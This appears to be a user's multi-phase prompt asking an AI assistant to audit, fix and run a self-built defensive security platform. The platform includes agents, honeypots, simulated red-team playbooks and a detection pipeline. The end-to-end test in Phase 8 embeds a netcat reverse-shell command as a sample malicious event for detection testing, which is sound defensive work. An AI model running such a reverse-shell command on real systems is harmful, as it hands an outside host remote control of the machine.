You are a senior DevOps and Python engineer. I have a cybersecurity platform called PhantomNet v3.0. 
I am a solo student founder building this as a commercial product on Windows WSL2 (Ubuntu). 
I have never run the full project end-to-end yet.

Your job is to:
1. Audit every component for startup errors, missing dependencies, misconfigurations, and broken imports
2. Fix every bug you find — show me the corrected file
3. Get the entire stack running on WSL2 from zero
4. Test every feature systematically and report what works, what's broken, and what's missing
5. Implement any missing critical pieces needed to make the system functional

Here is the full project structure and codebase. Work through it methodically.

---

## ENVIRONMENT
- OS: Windows 11 with WSL2 (Ubuntu 22.04)
- Python: 3.12
- Node: latest LTS
- Docker Desktop with WSL2 backend enabled
- Project root: ~/PhantomNet-v3.0

---

## PHASE 1 — ENVIRONMENT SETUP (do this first)

Check and fix the following, showing me every command to run:

1. Verify WSL2 has Docker socket access
2. Check all required system packages: python3.12, pip, node, npm, docker, docker-compose
3. Check ports 8000, 8001, 8002, 3000, 5432, 6379, 9092 are free
4. Verify the .env files exist — if not, generate sensible defaults for development
5. Check docker-compose.yml for:
   - Missing service definitions
   - Hardcoded paths that break on WSL
   - Missing healthchecks
   - Services that depend on each other with no depends_on
   - Any use of SQLite that should be PostgreSQL
   - Missing environment variable declarations
6. Fix docker-compose.yml and show me the corrected version

---

## PHASE 2 — BACKEND API AUDIT (backend_api/)

Test and fix every file in this order:

### Core files
- requirements.txt — check every package exists on PyPI, versions are compatible with Python 3.12, and nothing conflicts
- database.py — is it using SQLite or PostgreSQL? If SQLite, migrate to PostgreSQL with SQLAlchemy. Show corrected file.
- schemas.py — check all Pydantic models are valid for Pydantic v2
- auth.py — test JWT generation and validation. Fix any import errors. Verify token expiry is set.
- security_utils.py — check for any hardcoded secrets. Move them to environment variables.
- zero_trust_engine.py — verify it actually enforces policy on requests, not just defines it
- crl_utils.py — check cert revocation logic works without a running CA

### Service files
- agent_api.py — check all routes, request validation, and response models
- orchestrator_api.py — check it can actually communicate with microservices
- event_stream_processor.py — check Kafka/Redis connection, consumer group config, and error handling
- message_bus.py — verify it falls back gracefully if Kafka is unavailable
- health_monitor.py — check /health and /ready endpoints exist and return correct status codes
- osint_engine.py — check VirusTotal and MISP API integrations. Add Redis caching for lookups.
- compliance_engine.py — check it produces actual output, not just stubs
- report_service.py — check it can generate a PDF. If not, implement it using reportlab.
- email_service.py — check SMTP config. Add SendGrid fallback.
- blue_team_ai.py — check it connects to the AI model correctly
- dfir_toolkit.py — check PCAP and memory forensics functions are callable
- mitre_attack_integration.py — check MITRE data loads from mitre_data/ correctly
- bas_simulator.py — check attack simulation runs without crashing
- plugin_manager.py — check plugins load from the plugins/ directory
- sandbox_runner.py — check subprocess sandboxing actually isolates execution
- pnql_engine.py — check the query parser handles basic queries without crashing
- attack_path_generator.py — check it generates a valid attack path from sample data
- admin.py — check admin routes are protected and functional

### API Gateway (api_gateway/)
- app.py — check FastAPI app starts, all routes registered, CORS configured
- api_ecosystem.py — check all external integrations are initialised correctly
- test_app.py — run existing tests, show results, fix any failures

### Analyzer (analyzer/)
- app.py — check it starts and connects to the message broker
- consumer.py — check it consumes events correctly
- model.py — check ML model loads. If model file is missing, implement a simple rule-based fallback.
- neural_threat_brain.py — check inference runs on a sample event

### Blockchain Service (blockchain_service/)
- AuditTrail.sol — check Solidity compiles with solc. If solc missing, show install steps.
- blockchain.py — check it connects to a local Ethereum node or falls back to mock mode
- app.py — check the service starts and exposes write/read endpoints
- consumer.py — check it listens to the broker for audit events

### Collector (collector/)
- app.py — check the collector starts and can receive agent data

---

## PHASE 3 — AGENT AUDIT (phantomnet_agent/)

Test and fix every component:

### Core
- main.py — check entry point runs, loads config, starts all subsystems
- agent.py — check agent lifecycle: start, connect, collect, send, stop
- orchestrator.py — check it coordinates collectors and analyzers
- config/agent.yml — check all required fields present with sensible defaults

### Collectors (collectors/)
Test each collector starts without error:
- process_collector.py — check it reads /proc or uses psutil on Linux/WSL
- network_collector.py — check it captures network events (may need root in WSL)
- file_collector.py — check inotify works in WSL2
- dns_collector.py — check DNS query capture works
- log_collector.py — check it tails log files correctly
- container_collector.py — check Docker socket access from WSL
- self_monitor_collector.py — check it reports agent health metrics

### Bus (bus/)
- kafka_bus.py — check Kafka connection with retry logic
- redis_bus.py — check Redis connection with retry logic  
- http_bus.py — check HTTP fallback works when Kafka/Redis unavailable
- Verify the bus selection logic in base.py picks the right transport

### Analyzers (analyzers/)
- rule_based_analyzer.py — check rules load and match against sample events
- ml_analyzer.py — check model file exists. If not, create a simple scikit-learn baseline model and save it.
- ai_client.py — check it can call an LLM API. Add config for local Ollama as fallback.
- command_injection_analyzer.py — check it detects a sample command injection string
- local_rules_engine.py — check custom rules load from config

### Security (security/)
- auth.py — check agent-side auth works
- crypto.py — check encryption/decryption of telemetry data
- jwt_manager.py — check token generation and validation
- integrity.py — check file integrity checking works

### Actions (actions/)
- network_actions.py — check network isolation command works on WSL (may need iptables)
- process_actions.py — check process kill works
- system_actions.py — check system-level actions work within WSL constraints

### Red Teaming (red_teaming/)
- orchestrator.py — check it can load and run a playbook
- executor.py — check it executes attack steps safely in simulation mode
- playbook_library.py — check built-in playbooks load
- playbooks/ — THIS IS EMPTY. Implement these 5 playbooks as JSON/YAML files:
  1. credential_stuffing.yaml — simulate brute force login attempts
  2. lateral_movement.yaml — simulate internal network scanning  
  3. privilege_escalation.yaml — simulate sudo/SUID exploitation attempt
  4. data_exfiltration.yaml — simulate large outbound data transfer
  5. c2_beaconing.yaml — simulate periodic C2 callback pattern

### Honeypots (honeypots/)
- ssh_honeypot.py — check it starts on port 2222 and logs connections
- ftp_honeypot.py — check it starts on port 2121
- tcp_honeypot.py — check it listens and logs
- telnet_honeypot.py — check it starts on port 2323
- Implement missing: http_honeypot.py — fake login page on port 8080

### Digital Twin (digital_twin/)
- generator.py — check it generates a twin from aws_s3_template.yaml
- deployer.py — check deployment logic works in simulation mode
- sanity_checks.py — check validation passes on generated twins
- models.py — check data models are valid

### Plugins (plugins/)
- loader.py — check it discovers and loads plugins from the directory
- sandbox.py — check sandbox isolation works
- examples/sample_scanner/plugin.py — check it runs
- examples/sample_enricher/plugin.py — check it runs

### API (api/)
- control_api.py — check all control endpoints work
- health_api.py — check /health returns correct agent status
- log_streaming_api.py — check WebSocket log streaming works

---

## PHASE 4 — FEATURES AUDIT (features/)

Test each feature module:

- ai_autonomy_levels/autonomy_manager.py — check autonomy level switching works
- ai_threat_marketplace/phantom_exchange.py — check marketplace logic runs
- chrono_defense_layer/chrono_defense.py — check temporal correlation works  
- cognitive_core_intelligence/cognitive_core.py — check cognitive analysis runs
- cross_domain_fusion_intelligence/fusion_engine.py — check fusion logic works
- emotionally_aware_incident_assistant/incident_assistant.py — check incident response logic
- invisible_security_experience/seamless_defense.py — check transparent defense works
- phantom_chain/decentralized_trust_fabric.py — check trust chain logic
- phantom_os/edge_brain.py — check edge processing works
- quantum_aware_cyber_defense/quantum_defense.py — check it runs (likely simulated)
- self_evolving_threat_brain/ — check evolution logic
- synthetic_cognitive_memory/ — check memory persistence works
- neural_security_language/nsl_parser.py — check parser handles sample queries

For each: if it's a stub, implement a minimal working version. If it's broken, fix it.

---

## PHASE 5 — FRONTEND AUDIT (dashboard_frontend/)

1. Check package.json — verify all dependencies install without conflict on Node LTS
2. Check vite.config.js — verify proxy config points to correct backend ports
3. Check config.js — verify API base URLs are configurable via environment
4. Run npm install and fix any dependency errors
5. Run npm run build and fix any compilation errors
6. Test each component renders without crashing:
   - LoginPage.jsx — renders, form submits to auth endpoint
   - AdminDashboard.jsx — renders with mock data
   - SecurityAlerts.jsx — renders alert list
   - NetworkMap.jsx — renders network topology
   - Blockchain.jsx / Blockchain3D.jsx / BlockchainViewer.jsx — renders blockchain data
   - AIThreatBrain.jsx — renders threat analysis
   - AttackMapPage.jsx — renders attack map
   - GeoMap.jsx — renders geographic map
   - Chatbot.jsx — renders chat interface, sends message to backend
   - HoneypotSimulator.jsx — renders honeypot status
   - HealthStatus.jsx / HealthStatusWidget.jsx — renders system health
   - AuditLogViewer.jsx — renders audit log from blockchain
   - TwoFactorAuthSetup.jsx — renders 2FA setup flow
   - AR_SOC_Interface.jsx — renders (check if WebXR or just 3D)
   - FederationSettings.jsx — renders federation config

---

## PHASE 6 — PLUGINS AUDIT (plugins/)

Test each plugin in plugins/:
- anomaly_detector_ai/ — check anomaly_entry.py runs against sample data
- agent_personality_blue_team/ — check blue_team_personality_entry.py works
- kerbrute_scanner/ — check kerbrute_entry.py runs in simulation mode (do NOT run real Kerberos attacks)
- report_template_example/ — check report_entry.py generates a sample report
- test_plugin/ — check test_entry.py passes

---

## PHASE 7 — BLOCKCHAIN LAYER AUDIT (blockchain_layer/)

- blockchain.py — check the chain implementation is correct: genesis block, block addition, chain validation
- blockchain_client.py — check it can connect to the blockchain service
- test_blockchain.py — run tests, fix any failures
- conftest.py — check test fixtures are correct

---

## PHASE 8 — END-TO-END PIPELINE TEST

After fixing all individual components, run this full integration test:

1. Start the full stack: docker-compose up
2. Wait for all services to be healthy
3. Deploy a test agent on WSL localhost
4. Inject this simulated malicious event into the agent:
   {
     "type": "process_start",
     "pid": 9999,
     "name": "nc",
     "cmdline": "nc -e /bin/bash 192.168.1.100 4444",
     "user": "www-data",
     "timestamp": "<now>"
   }
5. Assert within 30 seconds:
   - Alert appears in the backend (GET /alerts)
   - SOAR fires a response action
   - Blockchain records the action (GET /blockchain/audit)
   - Dashboard shows the alert (check WebSocket)
6. Run a red team simulation (credential_stuffing playbook)
7. Assert the blue team detects and responds to it
8. Generate a compliance report and verify it's a valid PDF
9. Check all honeypots are logging connections

Write this as a pytest integration test file: tests/test_e2e_pipeline.py
Run it and fix every failure.

---

## PHASE 9 — MISSING CRITICAL IMPLEMENTATIONS

Implement these if they are stubs or missing:

1. Multi-tenant data isolation — every DB query must be scoped to an organisation_id
2. Rate limiting — add slowapi to the API gateway with Redis backend
3. Dead letter queue — add DLQ handling to the Kafka consumer
4. Secrets management — move all hardcoded secrets to .env with python-decouple
5. Structured logging — replace all print() statements with Python logging to JSON format
6. API response envelope — standardise all responses to {success, data, error, request_id}
7. WebSocket authentication — verify the dashboard WebSocket connection requires a valid JWT
8. Input sanitisation — verify all user inputs in agent_api.py and orchestrator_api.py use Pydantic strict validation
9. Graceful shutdown — verify all services handle SIGTERM cleanly without data loss
10. Database migrations — add Alembic for schema migrations so upgrades don't destroy data

---

## PHASE 10 — FINAL REPORT

After completing all phases, give me:

1. A summary table: Feature | Status (Working/Fixed/Still Broken) | Notes
2. A list of everything you implemented from scratch
3. A list of anything that cannot be fixed without external services (APIs, hardware, etc.)
4. The exact commands to run the full working stack on WSL2
5. Estimated test coverage percentage across the codebase
6. Top 5 remaining risks before this is production-ready

---

Work through each phase sequentially. Show all code changes as complete corrected files, not diffs. 
If a file needs a new dependency, add it to the correct requirements.txt or package.json.
Never skip a file — if something is out of scope, say so explicitly and why.